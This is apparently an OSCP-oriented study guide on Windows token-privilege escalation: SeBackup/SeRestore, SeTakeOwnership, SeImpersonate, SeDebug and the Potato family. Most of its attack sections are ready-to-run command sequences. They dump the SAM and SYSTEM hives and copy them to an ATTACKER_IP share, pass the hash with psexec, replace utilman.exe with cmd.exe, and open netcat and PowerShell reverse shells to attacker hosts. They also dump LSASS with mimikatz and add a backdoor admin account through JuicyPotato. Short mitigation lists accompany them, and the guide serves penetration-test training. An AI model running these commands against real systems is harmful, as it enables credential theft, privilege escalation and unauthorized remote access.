# Windows Token Privileges and Impersonation

Windows privileges are powerful rights assigned to user accounts that can be abused for privilege escalation. This document focuses on how to identify and exploit common Windows token privileges.

## Understanding Windows Privileges

Each Windows user has a set of assigned privileges that control what system-level operations they can perform. These privileges are independent of regular file/object permissions and can often be abused to escalate to higher access levels.

### Checking Privileges

To check the privileges assigned to your current token:

```cmd
whoami /priv
```

The output will show all privileges and their state (Enabled/Disabled). A privilege must typically be enabled to be used, but some exploits can enable disabled privileges.

## Exploitable Privileges

The most commonly abusable privileges include:

| Privilege | Description | Potential Abuse |
|-----------|-------------|-----------------|
| SeBackupPrivilege | Allows reading any file | Extract sensitive files (SAM, SYSTEM) |
| SeRestorePrivilege | Allows writing any file | Replace system files |
| SeTakeOwnershipPrivilege | Take ownership of any object | Replace system executables |
| SeImpersonatePrivilege | Impersonate clients | Use for token impersonation attacks |
| SeAssignPrimaryTokenPrivilege | Replace process token | Similar to impersonation |
| SeLoadDriverPrivilege | Load and unload drivers | Load malicious kernel drivers |
| SeDebugPrivilege | Debug any process | Access restricted processes, read memory |
| SeCreateTokenPrivilege | Create tokens | Create custom privileged tokens |

## SeBackup / SeRestore Exploitation

These privileges allow reading and writing to any file on the system, ignoring DACLs.

### Exploitation Steps

1. Verify privileges are present:
   ```cmd
   whoami /priv
   ```

2. Backup the SAM and SYSTEM registry hives:
   ```cmd
   reg save hklm\system C:\temp\system.hive
   reg save hklm\sam C:\temp\sam.hive
   ```

3. Transfer the hives to your attack machine using SMB or other methods:
   ```cmd
   # On attacker machine
   mkdir share
   python3 -m impacket.smbserver -smb2support -username user -password pass public share

   # On victim
   copy C:\temp\sam.hive \\ATTACKER_IP\public\
   copy C:\temp\system.hive \\ATTACKER_IP\public\
   ```

4. Extract password hashes using impacket:
   ```bash
   python3 -m impacket.secretsdump -sam sam.hive -system system.hive LOCAL
   ```

5. Use the hashes for Pass-the-Hash attacks:
   ```bash
   python3 -m impacket.psexec -hashes aad3b435b51404eeaad3b435b51404ee:HASH administrator@TARGET_IP
   ```

## SeTakeOwnership Exploitation

This privilege allows taking ownership of any object in the system.

### Exploitation Steps

1. Verify the privilege is present:
   ```cmd
   whoami /priv
   ```

2. Take ownership of a critical system file (e.g., utilman.exe):
   ```cmd
   takeown /f C:\Windows\System32\utilman.exe
   ```

3. Grant yourself full permissions:
   ```cmd
   icacls C:\Windows\System32\utilman.exe /grant YourUsername:F
   ```

4. Replace the file with a copy of cmd.exe:
   ```cmd
   copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
   ```

5. Lock the screen and click the "Ease of Access" button to spawn a SYSTEM shell

## SeImpersonate / SeAssignPrimaryToken Exploitation

These privileges allow a process to impersonate other users.

### How Token Impersonation Works

In Windows, services often need to perform actions on behalf of users. The impersonation privileges allow a service to "borrow" the access token of a connecting user:

1. User authenticates to a service
2. Service with impersonation privileges can use the user's token
3. Service can perform actions with the user's security context

### Common Vulnerable Accounts

* LOCAL SERVICE
* NETWORK SERVICE
* IIS Application Pool Identities (e.g., "iis apppool\defaultapppool")

### Exploitation with RogueWinRM

The RogueWinRM attack exploits the fact that the BITS service connects to port 5985 (WinRM) using SYSTEM privileges when started.

1. Verify impersonation privileges:
   ```cmd
   whoami /priv
   ```

2. Setup a listener on your attack machine:
   ```bash
   nc -lvp 4442
   ```

3. Run the RogueWinRM exploit:
   ```cmd
   RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   ```

4. When the BITS service starts, it will connect to your fake WinRM service, allowing you to impersonate the SYSTEM user

### Alternative: Potato Attacks

Several "Potato" attacks exist that abuse impersonation privileges:

* **JuicyPotato** - Works on Windows 7, 8, 10, Server 2008, and Server 2012
* **RoguePotato** - Works on newer systems with some adjustments
* **PrintSpoofer** - Exploits the Print Spooler service

Example with PrintSpoofer:
```cmd
PrintSpoofer.exe -i -c "cmd /c whoami > C:\temp\whoami.txt"
```

## SeDebug Exploitation

SeDebug allows you to debug any process, including those run by SYSTEM.

### Exploitation Steps

1. Verify the privilege is present:
   ```cmd
   whoami /priv
   ```

2. Use mimikatz to extract credentials from LSASS process:
   ```cmd
   privilege::debug
   sekurlsa::logonpasswords
   ```

3. Alternatively, dump the LSASS process and analyze offline:
   ```cmd
   procdump -ma lsass.exe lsass.dmp
   # Transfer to attacker machine
   # mimikatz: sekurlsa::minidump lsass.dmp + sekurlsa::logonpasswords
   ```

## Real-World Example: SeBackup / SeRestore

A server administrator created a "Backup Operators" group and added a user for backup purposes. This user had the SeBackup and SeRestore privileges.

1. Identify that we have the required privileges:
   ```cmd
   C:\> whoami /priv
   
   PRIVILEGES INFORMATION
   ----------------------
   
   Privilege Name                Description                    State
   ============================= ============================== ========
   SeBackupPrivilege             Back up files and directories  Disabled
   SeRestorePrivilege            Restore files and directories  Disabled
   ```

2. Exploit to extract registry hives:
   ```cmd
   C:\> reg save hklm\system C:\Users\BackupUser\system.hive
   The operation completed successfully.
   
   C:\> reg save hklm\sam C:\Users\BackupUser\sam.hive
   The operation completed successfully.
   ```

3. Extract hashes and gain access:
   ```bash
   # Extract hashes
   python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
   
   # Use the Administrator hash for Pass-the-Hash
   python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.10.10
   ```

## Mitigations

To protect against privilege abuse:

1. Limit the assignment of powerful privileges to only necessary users
2. Use Protected Process Light (PPL) for critical processes
3. Implement Just Enough Administration (JEA) for administrative tasks
4. Use Windows Defender Credential Guard to protect against credential theft
5. Regular audit privilege assignments with security baseline tools
6. Consider using AppLocker or similar to restrict execution of known exploitation tools

## OSCP Notes

For the OSCP exam, focus on the following privileges:
- SeBackup / SeRestore (registry hive extraction)
- SeTakeOwnership (system file replacement)
- SeImpersonate / SeAssignPrimaryToken (token impersonation attacks)

These attacks typically don't require complex tools, making them suitable for the exam environment.

## The Potato Attacks (Hot Potato, Rotten Potato, Juicy Potato)

"Potato" attacks are a family of privilege escalation techniques that exploit Windows token impersonation to elevate privileges from a standard user to SYSTEM. These attacks leverage various Windows services and protocols to obtain a SYSTEM token that can be impersonated.

### Hot Potato

Hot Potato (aka: Potato) is a technique that combines:
1. A local NBNS (NetBIOS Name Service) spoofer
2. A fake WPAD (Web Proxy Auto-Discovery) proxy server 
3. NTLM relay attack

It exploits the way Windows resolves names through NBNS and how it uses WPAD for proxy discovery, combined with NTLM relay to elevate privileges.

#### Requirements for Hot Potato

- Windows 7, 8, or early builds of Windows 10 / Windows Server 2016
- Local administrator rights (to create the necessary sockets)
- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

#### How Hot Potato Works

1. The attack tool starts a local NBNS spoofer that responds to broadcast NBNS queries
2. It also starts a rogue WPAD proxy server
3. When Windows tries to resolve the WPAD server (for proxy settings), the NBNS spoofer provides a response pointing to the attacker's machine
4. Windows attempts to connect to the fake WPAD server using NTLM authentication
5. The NTLM authentication attempt is relayed back to the local system, creating a SYSTEM token
6. Using SeImpersonatePrivilege, the attacker impersonates this token and executes commands as SYSTEM

#### Using Hot Potato

```powershell
# Using the original Potato exploit
.\potato.exe -ip 127.0.0.1 -cmd "C:\Windows\System32\cmd.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

# Using Empire's implementation
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
Import-Module .\Invoke-HotPotato.ps1
Invoke-HotPotato -Command "net user administrator P@ssw0rd123"
```

### Rotten Potato

Rotten Potato is an evolution of Hot Potato that focuses solely on the NTLM relay component. It exploits the DCOM (Distributed Component Object Model) service to force authentication and obtain a SYSTEM token.

#### Requirements for Rotten Potato

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- Works on Windows 8.1, 10, Server 2012, Server 2016

#### Using Rotten Potato

```powershell
# From a command prompt with appropriate privileges:
.\rottenpotato.exe

# From Metasploit (after getting a meterpreter shell):
load incognito
execute -f rottenpotato.exe
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Juicy Potato

Juicy Potato is a further refinement that exploits the COM marshalling mechanism in Windows. It leverages the fact that some COM servers run as SYSTEM and allow for token impersonation.

#### Requirements for Juicy Potato

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- Windows versions before certain security patches (doesn't work on Windows Server 2019)

#### Using Juicy Potato

```cmd
# Basic usage to launch cmd.exe as SYSTEM
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}

# Creating a new admin user
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123 /add && net localgroup administrators hacker /add" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

# Getting a reverse shell
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -e <base64EncodedReverseShellCommand>" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

Note: The CLSID (`-c` parameter) depends on the Windows version. A list of CLSIDs can be found in the Juicy Potato repository.

### Sweet Potato

Sweet Potato combines techniques from both Rotten and Juicy Potato but works on newer Windows versions where Juicy Potato fails, including Windows 10 and Server 2019.

#### Using Sweet Potato

```powershell
# Import the module
Import-Module .\SweetPotato.ps1

# Execute command as SYSTEM
Invoke-SweetPotato -Command "whoami > C:\temp\whoami.txt"
```

### PrintSpoofer and RoguePotato

These are newer alternatives when Juicy/Sweet Potato doesn't work:

```cmd
# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\Windows\System32\cmd.exe" -l 9999
```

### Mitigation Against Potato Attacks

To defend against these attacks:

1. Apply the latest Windows security updates
2. Restrict the assignment of SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege
3. Use Protected Users security group for sensitive accounts
4. Implement network segmentation to prevent NBNS/WPAD spoofing
5. Use WPAD Group Policy settings to disable automatic proxy discovery
6. Monitor for suspicious process creation and token manipulation events

### OSCP Exam Notes

For the OSCP exam:
- Hot Potato is useful for older Windows systems
- Juicy Potato works well on Windows 7 through early Windows 10
- Always check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege first
- Have multiple versions of potato exploits ready
- Document the specific technique and parameters used 